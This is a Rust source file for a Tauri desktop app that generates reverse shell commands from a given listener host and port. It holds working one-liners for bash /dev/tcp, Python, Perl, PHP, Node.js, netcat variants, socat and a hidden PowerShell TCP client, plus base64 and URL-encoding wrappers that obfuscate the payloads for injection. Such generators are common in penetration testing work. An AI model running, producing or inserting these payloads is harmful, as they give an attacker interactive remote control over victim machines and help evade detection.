#![cfg_attr(not(debug_assertions), windows_subsystem = "windows")]

use serde::{Deserialize, Serialize};
use std::str::FromStr;

#[derive(Debug, Clone, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
struct GeneratorRequest {
    lhost: String,
    lport: u16,
    kind: String,
    url_encode: bool,
    base64: bool,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
struct GeneratorResponse {
    command: String,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum PayloadKind {
    Bash,
    Sh,
    Python,
    Perl,
    Php,
    NodeJs,
    NetcatTraditional,
    Ncat,
    NetcatBusyBox,
    NetcatOpenBsd,
    Socat,
    Powershell,
}

impl FromStr for PayloadKind {
    type Err = ();
    fn from_str(s: &str) -> Result<Self, Self::Err> {
        match s.to_lowercase().as_str() {
            "bash" => Ok(Self::Bash),
            "sh" => Ok(Self::Sh),
            "python" | "python3" => Ok(Self::Python),
            "perl" => Ok(Self::Perl),
            "php" => Ok(Self::Php),
            "node" | "nodejs" => Ok(Self::NodeJs),
            "nc" | "netcat" => Ok(Self::NetcatTraditional),
            "ncat" => Ok(Self::Ncat),
            "netcat_busybox" | "busybox" => Ok(Self::NetcatBusyBox),
            "nc_openbsd" | "netcat_openbsd" => Ok(Self::NetcatOpenBsd),
            "socat" => Ok(Self::Socat),
            "powershell" | "pwsh" => Ok(Self::Powershell),
            _ => Err(()),
        }
    }
}

fn gen_payload(kind: PayloadKind, host: &str, port: u16) -> String {
    match kind {
        PayloadKind::Bash => format!("bash -c 'bash -i >& /dev/tcp/{host}/{port} 0>&1'"),
        PayloadKind::Sh => format!("/bin/sh -c 'sh -i >& /dev/tcp/{host}/{port} 0>&1'"),
        PayloadKind::Python => format!("python3 -c \"import os,pty,socket; s=socket.socket(); s.connect(('{}',{})); [os.dup2(s.fileno(),fd) for fd in (0,1,2)]; pty.spawn('/bin/bash')\"", host, port),
        PayloadKind::Perl => format!("perl -e 'use Socket;$i=\"{host}\";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}}'"),
        PayloadKind::Php => format!("php -r '$s=fsockopen(\"{host}\",{port});proc_open(\"/bin/sh -i\",[0=>$s,1=>$s,2=>$s],$pipes);'"),
        PayloadKind::NodeJs => format!("node -e \"const net=require('net'),cp=require('child_process');const client=new net.Socket();client.connect({},'{}',()=>{{const sh=cp.spawn('/bin/sh',['-i']);sh.stdout.pipe(client);sh.stderr.pipe(client);client.pipe(sh.stdin);}});\"", port, host),
        PayloadKind::NetcatTraditional => format!("nc -e /bin/sh {host} {port}"),
        PayloadKind::Ncat => format!("ncat -e /bin/sh {host} {port}"),
        PayloadKind::NetcatBusyBox => format!("busybox nc -e /bin/sh {host} {port}"),
        PayloadKind::NetcatOpenBsd => format!("rm -f /tmp/p; mkfifo /tmp/p; cat /tmp/p | /bin/sh -i 2>&1 | nc {host} {port} > /tmp/p"),
        PayloadKind::Socat => format!("socat TCP:{host}:{port} EXEC:/bin/sh,pty,stderr,setsid,sigint,sane"),
        PayloadKind::Powershell => format!("powershell -NoP -W Hidden -Exec Bypass -Command \"$client=New-Object System.Net.Sockets.TCPClient(\'{host}\',{port});$stream=$client.GetStream();[byte[]]$buffer=New-Object byte[] 1024;while(($i=$stream.Read($buffer,0,$buffer.Length)) -ne 0){{$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($buffer,0,$i);$sendback=(iex $data 2>&1 | Out-String );$sendback2=$sendback+\'PS \'+(pwd).Path+\'> \';$bytearray=(New-Object -TypeName System.Text.ASCIIEncoding).GetBytes($sendback2);$stream.Write($bytearray,0,$bytearray.Length);$stream.Flush()}};$client.Close()\""),
    }
}

fn b64_wrap(kind: PayloadKind, payload: &str) -> String {
    match kind {
        PayloadKind::Powershell => {
            use base64::engine::general_purpose;
            use base64::Engine;
            let utf16: Vec<u8> = payload.encode_utf16().flat_map(|c| c.to_le_bytes()).collect();
            let enc = general_purpose::STANDARD.encode(utf16);
            format!("powershell -NoP -W Hidden -Exec Bypass -enc {}", enc)
        }
        _ => {
            use base64::engine::general_purpose;
            use base64::Engine;
            let enc = general_purpose::STANDARD.encode(payload);
            format!("echo {} | base64 -d | bash", enc)
        }
    }
}

fn url_encode_all(s: &str) -> String {
    use percent_encoding::{utf8_percent_encode, AsciiSet, CONTROLS};
    const FRAGMENT: &AsciiSet = &CONTROLS
        .add(b' ')
        .add(b'"')
        .add(b'<')
        .add(b'>')
        .add(b'#')
        .add(b'?')
        .add(b'{')
        .add(b'}')
        .add(b'|')
        .add(b'\\')
        .add(b'^')
        .add(b'~')
        .add(b'[')
        .add(b']')
        .add(b'`')
        .add(b';')
        .add(b'/')
        .add(b':')
        .add(b'@')
        .add(b'=')
        .add(b'&')
        .add(b'$');
    utf8_percent_encode(s, FRAGMENT).to_string()
}

#[tauri::command]
fn generate_reverse_shell(req: GeneratorRequest) -> Result<GeneratorResponse, String> {
    let kind = PayloadKind::from_str(&req.kind).map_err(|_| "unsupported kind")?;
    let payload = gen_payload(kind, &req.lhost, req.lport);
    let mut cmd = if req.base64 { b64_wrap(kind, &payload) } else { payload };
    if req.url_encode {
        cmd = url_encode_all(&cmd);
    }
    Ok(GeneratorResponse { command: cmd })
}

#[tauri::command]
fn greet(name: &str) -> String { format!("Hello, {}! You've been greeted from Rust!", name) }

fn main() {
    tauri::Builder::default()
        .invoke_handler(tauri::generate_handler![greet, generate_reverse_shell])
        .run(tauri::generate_context!())
        .expect("error while running tauri application");
}
